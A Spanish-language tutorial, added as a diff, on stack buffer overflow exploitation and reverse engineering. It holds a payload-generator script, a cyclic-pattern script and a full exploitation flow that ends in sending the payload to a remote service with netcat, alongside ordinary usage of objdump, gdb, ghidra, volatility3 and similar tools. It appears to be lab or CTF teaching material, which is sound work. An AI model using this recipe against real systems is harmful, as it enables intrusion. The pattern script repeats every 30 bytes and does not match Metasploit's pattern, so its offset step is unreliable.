@@ -1,0 +1,197 @@
+================================================================================
+  GUÍA PRÁCTICA: BUFFER OVERFLOW + REVERSING CON HERRAMIENTAS OPEN SOURCE
+================================================================================
+>>> Copia todo en un archivo .txt. Todos los números y direcciones son EJEMPLOS.
+>>> No uses el signo $ como parte de comandos, solo lo pongo cuando es parte real.
+
+ÍNDICE (busca por [SECCIÓN]):
+[1] Script Python para payload buffer overflow
+[2] Script Python para patrón cíclico y calcular offset
+[3] objdump – análisis de binarios
+[4] checksec – protecciones (parte de pwntools)
+[5] binwalk – firmware y archivos embebidos
+[6] volatility3 – análisis de memoria RAM
+[7] gdb – depurador (con plugins PEDA/GEF)
+[8] ghidra – ingeniería inversa estática
+[9] Herramientas extra: strings, readelf, strace, ltrace, xxd, radare2
+[10] Ejemplo completo de flujo de explotación
+
+================================================================================
+[SECCIÓN 1] SCRIPT PYTHON PARA PAYLOAD (buffer overflow)
+================================================================================
+# Archivo: generate_payload.py
+import struct
+
+# CONFIGURACIÓN (estos valores son EJEMPLOS, cámbialos)
+OFFSET = 64          # bytes hasta EIP (obtenido con pattern)
+RET_ADDR = 0x08048400  # dirección de retorno (ej. función o gadget)
+SHELLCODE = b""      # opcional: bytes de shellcode
+USE_64 = False       # True si es binario de 64 bits
+
+payload = b"A" * OFFSET
+if USE_64:
+    payload += struct.pack("<Q", RET_ADDR)   # 64 bits
+else:
+    payload += struct.pack("<I", RET_ADDR)   # 32 bits
+if SHELLCODE:
+    payload += SHELLCODE
+
+with open("payload.bin", "wb") as f:
+    f.write(payload)
+print(f"Payload generado: {len(payload)} bytes")
+
+# Uso: python3 generate_payload.py; luego inyecta payload.bin.
+
+================================================================================
+[SECCIÓN 2] SCRIPT PARA PATRÓN CÍCLICO (encontrar offset)
+================================================================================
+# Archivo: pattern_gen.py
+# Genera 500 bytes cíclicos para crashear y hallar offset exacto.
+
+TAM = 500
+patron = b""
+for i in range(TAM):
+    c = (i // 3) % 10
+    if i % 3 == 0:
+        patron += bytes([0x41 + c % 26])  # A-Z
+    elif i % 3 == 1:
+        patron += bytes([0x61 + c % 26])  # a-z
+    else:
+        patron += bytes([0x30 + c % 10])  # 0-9
+
+with open("pattern.bin", "wb") as f:
+    f.write(patron)
+print("Patrón guardado en pattern.bin")
+
+# En gdb: run < pattern.bin; al crashear, mira EIP/RIP.
+# Calcula offset con:
+#   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41386141
+# (0x41386141 es EJEMPLO del valor de EIP)
+# También puedes usar el script de Metasploit (open source) o calcular manualmente.
+
+================================================================================
+[SECCIÓN 3] OBJDUMP – inspección de binarios (open source, parte de GNU binutils)
+================================================================================
+objdump -h binario          # cabeceras de secciones
+objdump -M intel -d binario # desensamblado con sintaxis Intel
+objdump -t binario          # tabla de símbolos (funciones, variables)
+objdump -s -j .rodata binario  # strings y datos constantes
+objdump -r binario          # relocations (para ROP)
+
+# Ejemplo: buscar dirección de main:
+objdump -t binario | grep main
+
+================================================================================
+[SECCIÓN 4] CHECKSEC – protecciones del binario (open source, parte de pwntools)
+================================================================================
+# Instalación: pip install pwntools (incluye checksec)
+checksec binario                # resumen rápido
+checksec --format=json binario  # salida JSON (puedes usar jq para filtrar)
+
+# Interpretación (ejemplos):
+# CANARY: activo → difícil desbordar directamente
+# NX: activo → stack no ejecutable (necesitas ROP)
+# PIE: activo → direcciones cambian con ASLR (necesitas leaks)
+# RELRO: parcial/total → protege GOT
+
+================================================================================
+[SECCIÓN 5] BINWALK – firmware y archivos ocultos (open source)
+================================================================================
+binwalk archivo.bin          # escanea firmas conocidas
+binwalk -e archivo.bin       # extrae automáticamente los hallazgos
+binwalk -Me archivo.bin      # extracción recursiva (profundo)
+binwalk -D 'zip:zip' archivo.bin  # extrae solo archivos ZIP
+
+# Ejemplo: extraer sistema de archivos de un firmware de router:
+binwalk -Me firmware.bin
+
+================================================================================
+[SECCIÓN 6] VOLATILITY3 – análisis de memoria RAM (forense, open source)
+================================================================================
+# volatility3 se ejecuta con el comando 'vol' (instalación: pip install volatility3)
+# Ejemplo: vol -f memory.dump windows.info
+# Primero identifica el perfil (SO):
+vol -f memory.dump windows.info   # muestra información del sistema
+
+# Comandos esenciales (reemplaza 'windows' por 'linux' o 'mac' según OS):
+vol -f memory.dump windows.pslist     # lista de procesos
+vol -f memory.dump windows.pstree     # procesos en árbol
+vol -f memory.dump windows.netscan    # conexiones de red
+vol -f memory.dump windows.cmdline    # líneas de comando de procesos
+vol -f memory.dump windows.malfind    # detecta inyecciones de código
+vol -f memory.dump windows.dumpfiles  # volcado de archivos de memoria
+
+# Para volcado de un proceso concreto (PID=1234, EJEMPLO):
+vol -f memory.dump windows.memmap --pid 1234 --dump
+
+# Linux: usar linux.bash_history, linux.pslist, etc.
+
+================================================================================
+[SECCIÓN 7] GDB – depurador (open source, con plugins PEDA/GEF)
+================================================================================
+gdb ./binario
+
+# Comandos básicos (ejemplos):
+b *0x08048400          # breakpoint en dirección (EJEMPLO)
+b main                 # breakpoint en main
+run < pattern.bin      # ejecutar con entrada desde archivo
+info reg               # ver todos los registros
+x/20x $esp             # ver 20 palabras en hex desde ESP
+x/10i $eip             # ver 10 instrucciones desde EIP
+set $eip = 0x08048400  # saltar a otra dirección (EJEMPLO)
+disas main             # desensamblar main
+
+# Plugins recomendados (open source):
+# PEDA: git clone https://github.com/longld/peda && echo "source peda/peda.py" >> ~/.gdbinit
+# GEF:  git clone https://github.com/hugsy/gef && echo "source gef/gef.py" >> ~/.gdbinit
+
+# Con PEDA:
+pattern create 100
+pattern offset 0x41386141   # (EJEMPLO) calcula offset
+checksec                    # protecciones dentro de gdb
+
+================================================================================
+[SECCIÓN 8] GHIDRA – ingeniería inversa estática (open source, de la NSA)
+================================================================================
+# Ejecutar: ghidraRun (desde terminal) o lanzar el script.
+# Flujo:
+# 1. File → Import File → seleccionar binario.
+# 2. Analysis → Auto Analysis (marcar todo) → Analyze.
+# 3. En Symbol Tree, buscar main o función de interés.
+# 4. Presionar 'D' para ver el código decompilado (C pseudo).
+# 5. Buscar strings: Window → Defined Strings.
+# 6. Para parchar: botón derecho en ensamblador → Patch Instruction.
+
+# Modo headless (automático):
+./analyzeHeadless ./project -import binario -analysisTimeout 30
+
+================================================================================
+[SECCIÓN 9] HERRAMIENTAS EXTRAS (todas open source)
+================================================================================
+strings binario               # extrae cadenas legibles
+strings -n 8 binario          # mínimo 8 caracteres
+readelf -h binario            # cabecera ELF
+readelf -S binario            # secciones
+ldd binario                   # bibliotecas dinámicas usadas
+strace ./binario              # traza llamadas al sistema
+ltrace ./binario              # traza llamadas a bibliotecas
+xxd binario | head            # ver hexdump (primeras líneas)
+radare2 ./binario             # framework consola; dentro: aaa; afl; pdf; s main; V!
+
+================================================================================
+[SECCIÓN 10] EJEMPLO DE FLUJO COMPLETO DE EXPLOTACIÓN
+================================================================================
+1. checksec ./vuln           # ver protecciones
+2. python3 pattern_gen.py    # genera pattern.bin
+3. gdb ./vuln → run < pattern.bin → info reg eip → obtener 0x41386141 (EJEMPLO)
+4. pattern_offset 0x41386141 → da OFFSET=64 (EJEMPLO)
+5. objdump -t ./vuln | grep system → obtener dirección de system o de JMP ESP
+6. Editar generate_payload.py con OFFSET y RET_ADDR
+7. python3 generate_payload.py → se crea payload.bin
+8. (cat payload.bin; cat) | ./vuln   # local
+   nc servidor 1337 < payload.bin     # remoto (netcat también open source)
+
+================================================================================
+NOTA: Todas las direcciones (0x08048400, 0x41386141) y offsets (64) son EJEMPLOS.
+      Sustituye siempre por los valores reales de tu binario.
+================================================================================
